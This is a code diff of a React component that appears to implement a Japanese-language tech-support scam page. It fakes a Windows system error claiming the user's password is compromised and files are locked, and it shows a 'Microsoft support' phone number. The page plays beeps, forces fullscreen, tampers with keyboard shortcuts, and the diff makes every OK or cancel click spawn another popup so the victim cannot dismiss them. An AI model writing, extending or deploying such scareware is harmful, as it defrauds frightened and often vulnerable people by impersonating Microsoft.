@@ -1,30 +1,34 @@
 import React, { useEffect, useState } from "react";
 import "./index.scss";
 import userPhoto from "../images/user.jpeg";
-import windowCross from "../images/windowcross.png";
 import firstPic from "../images/1.jpeg";
 import secondPic from "../images/2.jpeg";
 import thirdPic from "../images/3.jpeg";
 import microsoftLogo from "../images/microsoftLogo.jpeg";
 import warningIcon from "../images/warning.png";
 import beepAudio from "../beep-04.mp3";
-import { Modal, Row, Col, message, notification } from "antd";
+import { message, notification } from "antd";
 import PhoneLogo from "../images/phn.svg";
 import {
     makeWindowFullScreen,
     addShortcutsKeyboard,
 } from "../utils/ShortcutEnableDisable";
+import MainModal from "../MainModal";
+import AlternateModals from "../AlternateModals";
 
 const Login = (props) => {
     const [audio] = useState(new Audio(beepAudio));
     const [phoneNumber] = useState("(50)-5806-5449");
 
+    const [modals, setModals] = useState([]);
+
     const [isModalVisible, setIsModalVisible] = useState(false);
+
     const requestFullScreen = () => {
         addShortcutsKeyboard();
         makeWindowFullScreen();
         loginToDash();
-        document.getElementById("login-wrapper").style.cursor = "none";
+        // document.getElementById("login-wrapper").style.cursor = "none";
     };
 
     const showModal = () => {
@@ -32,9 +36,14 @@ const Login = (props) => {
     };
 
     const handleCancel = () => {
-        setIsModalVisible(false);
+        setModals([...modals, 1]);
         notificationPopup();
     };
+
+    const handleOk = () => {
+        setModals([...modals, 1]);
+        notificationPopup();
+    }
 
     useEffect(() => {
         document.addEventListener("fullscreenchange", exitHandler);
@@ -80,50 +89,14 @@ const Login = (props) => {
 
     return (
         <>
-            <Modal
-                maskClosable={false}
-                footer={null}
-                header={null}
-                centered
-                visible={isModalVisible}
-                onCancel={handleCancel}
-                bodyStyle={{height: "300px", fontSize: "18px", fontWeight: "bold" , cursor: "none"}}
-                width={600}
-                keyboard={false}
-                wrapClassName="noCursor"
-                maskStyle={{background: "blue"}}
-            >
-                <p>C:WINDOWS\SYSTEM32\MSVCR120.dll</p>
+            <MainModal isModalVisible={isModalVisible} setIsModalVisible={setIsModalVisible} handleCancel={handleCancel} handleOk={handleOk} phoneNumber={phoneNumber} />
+            
+            {modals.map(() => {
+                return (
+                    <AlternateModals isModalVisible={true} handleCancel={handleCancel} handleOk={handleOk} phoneNumber={phoneNumber} />
+                )
+            })}
 
-                <br />
-
-                <Row>
-                    <Col span={4}>
-                        <img src={windowCross} id="windowCross" />
-                    </Col>
-                    <Col span={20}>
-                        Windowsのパスワードが危険にさらされています。ファイルへのアクセスは拒否されます。マイクロソフトサポート担当者に連絡してください：
-                        <img
-                            src={PhoneLogo}
-                            height={15}
-                            style={{ marginRight: "8px" }}
-                        />
-                        {phoneNumber}
-                    </Col>
-                </Row>
-
-                <br />
-                <Row justify="end">
-                    <Col>
-                        <button
-                            style={{ width: "100px" }}
-                            onClick={handleCancel}
-                        >
-                            OK
-                        </button>
-                    </Col>
-                </Row>
-            </Modal>
             <div
                 onClick={requestFullScreen}
                 className="login-wrapper"
